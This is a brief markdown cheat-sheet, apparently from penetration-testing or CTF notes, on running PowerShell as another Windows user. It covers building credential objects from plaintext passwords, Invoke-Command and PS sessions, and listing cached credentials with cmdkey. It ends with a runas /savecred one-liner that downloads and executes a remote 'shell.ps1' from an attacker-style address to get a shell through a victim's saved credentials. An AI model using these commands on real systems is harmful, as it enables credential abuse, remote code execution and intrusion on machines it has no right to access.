---
title: "Runas"
date: 2024-7-10
tags: ["powershell", "cred object", "Windows", "runas"]
---

---
### Runas (with creds)

#### Create Cred Object #1

```powershell
$username = "domain\username"
```

```powershell
$password = "password"
```

```powershell
$secstr = New-Object -TypeName System.Security.SecureString
```

```powershell
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

#### Create Cred Object #2

```powershell
$password = ConvertTo-SecureString "password" -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential("domain\username", $password)
```

#### Run Commnad

```powershell
Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
```

```powershell
# If error, try
Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost -auth credssp
```

```powershell
# Invoke command with config
Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost -ConfigurationName config_name
```

#### Create a new PS session

```powershell
new-pssession -computername . -credential $cred
```

```pwershell
# Switch to new session
enter-pssession 1
```

### Runas (with cache creds)

#### Check cache creds

```powershell
cmdkey /list
```

#### Run Command

```powershell
# e.g. Upload and run a shell
runas /user:domain\username /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')"
```

<br>
